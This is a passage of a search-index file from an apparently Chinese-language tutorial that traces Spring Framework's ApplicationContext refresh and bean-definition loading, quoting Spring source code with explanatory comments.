<li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableApplicationContext.java Java<pre><code>    public AbstractRefreshableApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#324-abstractapplicationcontext","title":"3.2.4 AbstractApplicationContext\u200b\u62bd\u8c61\u7c7b","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>    public AbstractApplicationContext(@Nullable ApplicationContext parent) {\n        this();\n        setParent(parent);\n    }\n\n    //\u200b\u4e0a\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200bthis()\u200b\u65b9\u6cd5\u200b \n    public AbstractApplicationContext() {\n        this.resourcePatternResolver = getResourcePatternResolver();\n    }\n\n    //\u200b\u4e0a\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200b getResourcePatternResolver()\u200b\u65b9\u6cd5\u200b\n    protected ResourcePatternResolver getResourcePatternResolver() {\n        return new PathMatchingResourcePatternResolver(this);\n    }\n\n    // this()\u200b\u4e4b\u540e\u200b\u7684\u200bsetParent(parent);\u200b\u65b9\u6cd5\u200b\n    @Override\n    public void setParent(@Nullable ApplicationContext parent) {\n        this.parent = parent;\n        if (parent != null) {\n            Environment parentEnvironment = parent.getEnvironment();\n            if (parentEnvironment instanceof ConfigurableEnvironment) {\n                getEnvironment().merge((ConfigurableEnvironment) parentEnvironment);\n            }\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#35-pathmatchingresourcepatternresolver","title":"3.5 PathMatchingResourcePatternResolver\u200b\u7c7b","text":"<ul> <li>PathMatchingResourcePatternResolver(this)\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.core.io.support.PathMatchingResourcePatternResolver.java Java<pre><code>    public PathMatchingResourcePatternResolver(ResourceLoader resourceLoader) {\n        Assert.notNull(resourceLoader, \"ResourceLoader must not be null\");\n        this.resourceLoader = resourceLoader;\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#4setconfiglocationsstring-locations","title":"4.setConfigLocations(String... locations) \u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u8bbe\u7f6e\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#41-abstractrefreshableconfigapplicationcontextsetconfiglocationsnullable-string-locations","title":"4.1 AbstractRefreshableConfigApplicationContext.setConfigLocations(@Nullable String... locations) \u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableConfigApplicationContext.java Java<pre><code>    public void setConfigLocations(@Nullable String... locations) {\n        if (locations != null) {\n            Assert.noNullElements(locations, \"Config locations must not be null\");\n            this.configLocations = new String[locations.length];\n            for (int i = 0; i &lt; locations.length; i++) {\n                this.configLocations[i] = resolvePath(locations[i]).trim();\n            }\n        }\n        else {\n            this.configLocations = null;\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#5-refresh","title":"5. refresh()\u200b\u65b9\u6cd5","text":"<ul> <li>AbstractApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200brefresh()\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u5237\u65b0\u200b\u64cd\u4f5c\u200b\u7684\u200b\u4e00\u4e9b\u200b\u6b65\u9aa4\u200b\uff0c\u200b\u53ea\u662f\u200b\u4e00\u4e2a\u200b\u6a21\u677f\u200b\uff0c\u200b\u4e2a\u6027\u5316\u200b\u7684\u200b\u903b\u8f91\u200b\u7531\u5176\u5b50\u200b\u7c7b\u6765\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#51-refresh","title":"5.1 refresh()\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>@Override\npublic void refresh() throws BeansException, IllegalStateException {\n    synchronized (this.startupShutdownMonitor) {\n        // Prepare this context for refreshing.\n        prepareRefresh();\n\n        // Tell the subclass to refresh the internal bean factory.\n        // \u200b\u521b\u5efa\u200bBeanFactory\n        ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n\n        // Prepare the bean factory for use in this context.\n        prepareBeanFactory(beanFactory);\n\n        try {\n            // Allows post-processing of the bean factory in context subclasses.\n            postProcessBeanFactory(beanFactory);\n\n            // Invoke factory processors registered as beans in the context.\n            invokeBeanFactoryPostProcessors(beanFactory);\n\n            // Register bean processors that intercept bean creation.\n            registerBeanPostProcessors(beanFactory);\n\n            // Initialize message source for this context.\n            initMessageSource();\n\n            // Initialize event multicaster for this context.\n            initApplicationEventMulticaster();\n\n            // Initialize other special beans in specific context subclasses.\n            onRefresh();\n\n            // Check for listener beans and register them.\n            registerListeners();\n\n            // Instantiate all remaining (non-lazy-init) singletons.\n            // \u200b\u5b9e\u4f8b\u200b\u5316\u200bBean\n            finishBeanFactoryInitialization(beanFactory);\n\n            // Last step: publish corresponding event.\n            finishRefresh();\n        }\n\n        catch (BeansException ex) {\n            if (logger.isWarnEnabled()) {\n                logger.warn(\"Exception encountered during context initialization - \" +\n                        \"cancelling refresh attempt: \" + ex);\n            }\n\n            // Destroy already created singletons to avoid dangling resources.\n            destroyBeans();\n\n            // Reset 'active' flag.\n            cancelRefresh(ex);\n\n            // Propagate exception to caller.\n            throw ex;\n        }\n\n        finally {\n            // Reset common introspection caches in Spring's core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#52-preparerefresh","title":"5.2 prepareRefresh()\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u6b63\u5f0f\u200bRefresh()\u200b\u64cd\u4f5c\u524d\u200b\u7684\u200b\u51c6\u5907\u200b\u5de5\u4f5c\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void prepareRefresh() {\n    // Switch to active.\n    this.startupDate = System.currentTimeMillis();\n    this.closed.set(false);\n    this.active.set(true);\n\n    if (logger.isDebugEnabled()) {\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Refreshing \" + this);\n        }\n        else {\n            logger.debug(\"Refreshing \" + getDisplayName());\n        }\n    }\n\n    // Initialize any placeholder property sources in the context environment.\n    initPropertySources();\n\n    // Validate that all properties marked as required are resolvable:\n    // see ConfigurablePropertyResolver#setRequiredProperties\n    getEnvironment().validateRequiredProperties();\n\n    // Store pre-refresh ApplicationListeners...\n    if (this.earlyApplicationListeners == null) {\n        this.earlyApplicationListeners = new LinkedHashSet&lt;&gt;(this.applicationListeners);\n    }\n    else {\n        // Reset local application listeners to pre-refresh state.\n        this.applicationListeners.clear();\n        this.applicationListeners.addAll(this.earlyApplicationListeners);\n    }\n\n    // Allow for the collection of early ApplicationEvents,\n    // to be published once the multicaster is available...\n    this.earlyApplicationEvents = new LinkedHashSet&lt;&gt;();\n}\n\n// \u200b\u4e0a\u8ff0\u200b\u5b9a\u4e49\u200b\u7684\u200binitPropertySources()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7531\u200b\u5b50\u7c7b\u200b\u5b9e\u73b0\u200b\nprotected void initPropertySources() {\n    // For subclasses: do nothing by default.\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#53-obtainfreshbeanfactory","title":"5.3 obtainFreshBeanFactory()\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u521b\u5efa\u200bBeanFactory\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>    protected ConfigurableListableBeanFactory obtainFreshBeanFactory() {\n        refreshBeanFactory();// \u200b\u5237\u65b0\u200bBeanFactory\uff0c\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7531\u5176\u5b50\u200b\u7c7b\u200b\u5b9e\u73b0\u200b,5.3.1\u200b\u4e2d\u6709\u200b\u8bf4\u660e\u200b\n        return getBeanFactory();// \u200b\u83b7\u53d6\u200bBeanFactory\uff0c\u200b\u7236\u7c7b\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7ee7\u627f\u200b\u5e76\u200b\u7531\u5176\u5b50\u200b\u7c7b\u200b\u5b9e\u73b0\u200b\n    }\n\n    protected abstract void refreshBeanFactory() throws BeansException, IllegalStateException;\n\n    @Override // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u5728\u200bConfigurableApplicationContext\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\n    public abstract ConfigurableListableBeanFactory getBeanFactory() throws IllegalStateException;\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#531-refreshbeanfactory","title":"5.3.1 refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0","text":"<ul> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b</li> <li>refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u662f\u200bAbstractApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b</li> <li>AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u662f\u200b\u8be5\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\uff1a\u200b\u5237\u65b0\u200bBeanFactory Java<pre><code>// AbstractRefreshableApplicationContext\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0\u200b\n@Override\nprotected final void refreshBeanFactory() throws BeansException {\n    // \u200b\u68c0\u67e5\u200b\u4e0a\u4e0b\u6587\u200b\u4e2d\u200b\u662f\u5426\u200b\u5df2\u200b\u5b58\u5728\u200bBeanFactory\n    if (hasBeanFactory()) {\n        // \u200b\u5b58\u5728\u200bBeanFactory\u200b\u65f6\u5148\u200b\u9500\u6bc1\u200b\u5df2\u200b\u5b58\u5728\u200b\u7684\u200bBeanFactory\n        destroyBeans();//\u200b\u8c03\u7528\u200bAbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\n        /**\n        * \u200b\u4ee5\u4e0b\u200b\u662f\u200bAbstractApplicationContext\u200b\u4e2d\u200bdestroyBeans()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5b9e\u73b0\u200b\n        * protected void destroyBeans() {\n        *    getBeanFactory().destroySingletons();\n        * }\n        */\n        closeBeanFactory();// \u200b\u8c03\u7528\u200b\u672c\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200bcloseBeanFactory()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\n    }\n    try {\n        // \u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200bBeanFactory\n        // \u200b\u4e0b\u9762\u200b\u8fd9\u200b\u884c\u200b\u4ee3\u7801\u200b\u53ea\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u7684\u200bBeanFactory\uff0c\u200b\u5e76\u672a\u200b\u6709\u200b\u4efb\u4f55\u200bBean\n        DefaultListableBeanFactory beanFactory = createBeanFactory();\n        beanFactory.setSerializationId(getId());\n        customizeBeanFactory(beanFactory);\n        loadBeanDefinitions(beanFactory);// refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6838\u5fc3\u200b\n        synchronized (this.beanFactoryMonitor) {\n            this.beanFactory = beanFactory;\n        }\n    }\n    catch (IOException ex) {\n        throw new ApplicationContextException(\"I/O error parsing bean definition source for \" + getDisplayName(), ex);\n    }\n}\n\n// AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5185\u200b\u8c03\u7528\u200b\u7684\u200bcloseBeanFactory()\u200b\u65b9\u6cd5\u200b\n@Override\nprotected final void closeBeanFactory() {\n    synchronized (this.beanFactoryMonitor) {\n        if (this.beanFactory != null) {\n            //\u200b\u9500\u6bc1\u200b\u5df2\u200b\u5b58\u5728\u200b\u7684\u200bBeanFactory\n            this.beanFactory.setSerializationId(null);\n            this.beanFactory = null;\n        }\n    }\n}\n\n//AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5185\u200b\u8c03\u7528\u200bcreateBeanFactory()\u200b\u65b9\u6cd5\u200b\nprotected DefaultListableBeanFactory createBeanFactory() {\n    // \u200b\u8c03\u7528\u200b\u4e0b\u9762\u200b AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bgetInternalParentBeanFactory()\u200b\u65b9\u6cd5\u200b\n    return new DefaultListableBeanFactory(getInternalParentBeanFactory());\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractapplicationcontextgetinternalparentbeanfactory","title":"AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bgetInternalParentBeanFactory()\u200b\u65b9\u6cd5","text":"Java<pre><code>@Nullable\nprotected BeanFactory getInternalParentBeanFactory() {\n    return (getParent() instanceof ConfigurableApplicationContext ?\n            ((ConfigurableApplicationContext) getParent()).getBeanFactory() : getParent());\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#defaultlistablebeanfactory","title":"DefaultListableBeanFactory\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5","text":"Java<pre><code>public DefaultListableBeanFactory(@Nullable BeanFactory parentBeanFactory) {\n    super(parentBeanFactory);// \u200b\u8c03\u7528\u200bAbstractAutowireCapableBeanFactory(\u200b\u62bd\u8c61\u7c7b\u200b)\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#defaultlistablebeanfactoryabstractautowirecapablebeanfactory","title":"DefaultListableBeanFactory\u200b\u7236\u7c7b\u200bAbstractAutowireCapableBeanFactory(\u200b\u62bd\u8c61\u7c7b\u200b)\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5","text":"Java<pre><code>public AbstractAutowireCapableBeanFactory(@Nullable BeanFactory parentBeanFactory) {\n    this();\n    setParentBeanFactory(parentBeanFactory);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractrefreshableapplicationcontextcustomizebeanfactorybeanfactory","title":"AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200bcustomizeBeanFactory(beanFactory)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void customizeBeanFactory(DefaultListableBeanFactory beanFactory) {\n    if (this.allowBeanDefinitionOverriding != null) {\n        beanFactory.setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);\n    }\n    if (this.allowCircularReferences != null) {\n        beanFactory.setAllowCircularReferences(this.allowCircularReferences);\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractrefreshableapplicationcontextloadbeandefinitionsbeanfactory","title":"AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u662f\u200b\u5b9e\u73b0\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b</li> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b Java<pre><code>protected abstract void loadBeanDefinitions(DefaultListableBeanFactory beanFactory)\n        throws BeansException, IOException;\n</code></pre></li> <li>\u200b\u8be5\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200borg.springframework.context.support.AbstractXmlApplicationContext\u200b\u4e2d\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#orgspringframeworkcontextsupportabstractxmlapplicationcontextloadbeandefinitionsdefaultlistablebeanfactory-beanfactory","title":"org.springframework.context.support.AbstractXmlApplicationContext\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200b Java<pre><code>@Override\nprotected void loadBeanDefinitions(DefaultListableBeanFactory beanFactory) throws BeansException, IOException {\n    // Create a new XmlBeanDefinitionReader for the given BeanFactory.\n    // \u200b\u901a\u8fc7\u200b\u4e0a\u200b\u4e00\u6b65\u200b\u521b\u5efa\u200b\u7684\u200b\u7a7a\u200bBeanFactory\u200b\u6765\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200bXmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\n    // XmlBeanDefinitionReader\u200b\u7528\u4e8e\u200b\u89e3\u6790\u200bxml\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200bbean\n    XmlBeanDefinitionReader beanDefinitionReader = new XmlBeanDefinitionReader(beanFactory); //\n\n    // Configure the bean definition reader with this context's\n    // resource loading environment.\n    beanDefinitionReader.setEnvironment(this.getEnvironment());\n    beanDefinitionReader.setResourceLoader(this);\n    beanDefinitionReader.setEntityResolver(new ResourceEntityResolver(this));\n\n    // Allow a subclass to provide custom initialization of the reader,\n    // then proceed with actually loading the bean definitions.\n    initBeanDefinitionReader(beanDefinitionReader);\n    loadBeanDefinitions(beanDefinitionReader); //\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5165\u200b\u53c2\u662f\u200b\u4e0a\u9762\u200b\u751f\u6210\u200b\u7684\u200bbeanDefinitionReader\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#new-xmlbeandefinitionreaderbeanfactory","title":"new XmlBeanDefinitionReader(beanFactory)","text":"<ul> <li>XmlBeanDefinitionReader(beanFactory)\u200b\u6784\u9020\u65b9\u6cd5\u200b\u8c03\u7528\u200b\u5176\u7236\u200b\u7c7b\u200bAbstractBeanDefinitionReader\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u5982\u4e0b\u200b Java<pre><code>protected AbstractBeanDefinitionReader(BeanDefinitionRegistry registry) {\n    Assert.notNull(registry, \"BeanDefinitionRegistry must not be null\");\n    this.registry = registry;\n\n    // Determine ResourceLoader to use.\n    if (this.registry instanceof ResourceLoader) {\n        this.resourceLoader = (ResourceLoader) this.registry;\n    }\n    else {\n        this.resourceLoader = new PathMatchingResourcePatternResolver();\n    }\n\n    // Inherit Environment if possible\n    if (this.registry instanceof EnvironmentCapable) {\n        this.environment = ((EnvironmentCapable) this.registry).getEnvironment();\n    }\n    else {\n        this.environment = new StandardEnvironment();\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractxmlapplicationcontextinitbeandefinitionreaderbeandefinitionreader","title":"AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200binitBeanDefinitionReader(beanDefinitionReader)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void initBeanDefinitionReader(XmlBeanDefinitionReader reader) {\n    reader.setValidating(this.validating);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractxmlapplicationcontextloadbeandefinitionsxmlbeandefinitionreader-reader","title":"AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4e3b\u8981\u200b\u529f\u80fd\u200b\u662f\u200b\u89e3\u6790\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> <li>\u200b\u8c03\u7528\u200bXmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\u7684\u200bloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u89e3\u6790\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b Java<pre><code>protected void loadBeanDefinitions(XmlBeanDefinitionReader reader) throws BeansException, IOException {\n    Resource[] configResources = getConfigResources();\n    if (configResources != null) {\n        reader.loadBeanDefinitions(configResources); //\u200b\u5177\u4f53\u200b\u8c03\u7528\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200bloadBeanDefinitions(Resource... resources)\u200b\u65b9\u6cd5\u200b\n    }\n    String[] configLocations = getConfigLocations();\n    if (configLocations != null) {\n        reader.loadBeanDefinitions(configLocations);//\u200b\u5177\u4f53\u200b\u8c03\u7528\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200bloadBeanDefinitions(String... locations)\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#readerloadbeandefinitionsconfigresourcesreaderloadbeandefinitionsconfiglocations","title":"reader.loadBeanDefinitions(configResources)\u200b\u65b9\u6cd5\u200b\u4e0e\u200breader.loadBeanDefinitions(configLocations)\u200b\u65b9\u6cd5","text":"<ul> <li>XmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\u7684\u200bloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u7528\u4e8e\u200b\u89e3\u6790\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b</li> <li>reader\u200b\u662f\u200bXmlBeanDefinitionReader\u200b\u7c7b\u578b\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0cloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff0c</li> <li>loadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u5177\u4f53\u200b\u662f\u200b\u5728\u200bAbstractBeanDefinitionReader\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>@Override\npublic int loadBeanDefinitions(Resource... resources) throws BeanDefinitionStoreException {\n    Assert.notNull(resources, \"Resource array must not be null\");\n    int count = 0;\n    // \u200b\u904d\u5386\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8d44\u6e90\u200b\u5e76\u200b\u4f9d\u6b21\u200b\u8c03\u7528\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(Resource resource)\uff0c\u200b\u5b9a\u4e49\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b\n    for (Resource resource : resources) {\n        count += loadBeanDefinitions(resource);//\n    }\n    return count;\n}\n\n@Override\npublic int loadBeanDefinitions(String... locations) throws BeanDefinitionStoreException {\n    Assert.notNull(locations, \"Location array must not be null\");\n    int count = 0;\n    //\u200b\u904d\u5386\u200b\u8d44\u6e90\u200b\u6570\u7ec4\u200b\uff0c\u200b\u8c03\u7528\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(String location)\n    for (String location : locations) {\n        count += loadBeanDefinitions(location);//\n    }\n    return count;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#count-loadbeandefinitionsresourceloadbeandefinitionsresource","title":"count += loadBeanDefinitions(resource)\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(resource)\u200b\u65b9\u6cd5","text":"<ul> <li>loadBeanDefinitions(resource)\u200b\u65b9\u6cd5\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b</li> <li>XmlBeanDefinitionReader\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>@Override\npublic int loadBeanDefinitions(Resource resource) throws BeanDefinitionStoreException {\n    return loadBeanDefinitions(new EncodedResource(resource));\n}\n</code></pre></li> <li>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u53c8\u200b\u8c03\u7528\u200b\u4e86\u200bloadBeanDefinitions(new EncodedResource(resource))\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b,\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public int loadBeanDefinitions(EncodedResource encodedResource) throws BeanDefinitionStoreException {\n    Assert.notNull(encodedResource, \"EncodedResource must not be null\");\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Loading XML bean definitions from \" + encodedResource);\n    }\n\n    Set&lt;EncodedResource&gt; currentResources = this.resourcesCurrentlyBeingLoaded.get();\n    if (currentResources == null) {\n        currentResources = new HashSet&lt;&gt;(4);\n        this.resourcesCurrentlyBeingLoaded.set(currentResources);\n    }\n    if (!currentResources.add(encodedResource)) {\n        throw new BeanDefinitionStoreException(\"Detected cyclic loading of \" + encodedResource + \" - check your import definitions!\");\n    }\n    try {\n        //\u200b\u4ee5\u6d41\u200b\u7684\u200b\u5f62\u5f0f\u200b\u8bfb\u53d6\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\n        InputStream inputStream = encodedResource.getResource().getInputStream();\n        try {\n            InputSource inputSource = new InputSource(inputStream);\n            if (encodedResource.getEncoding() != null) {\n                inputSource.setEncoding(encodedResource.getEncoding());\n            }\n            // \u200b\u8c03\u7528\u200bdoLoadBeanDefinitions\u200b\u89e3\u6790\u200b\u8f7d\u5165\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200bbean\u200b\u5b9a\u4e49\u200b\n            return doLoadBeanDefinitions(inputSource, encodedResource.getResource());\n        }\n        finally {\n            inputStream.close();\n        }\n    }\n    catch (IOException ex) {\n        throw new BeanDefinitionStoreException(\n                \"IOException parsing XML document from \" + encodedResource.getResource(), ex);\n    }\n    finally {\n        currentResources.remove(encodedResource);\n        if (currentResources.isEmpty()) {\n            this.resourcesCurrentlyBeingLoaded.remove();\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#count-loadbeandefinitionslocationloadbeandefinitionslocation","title":"count += 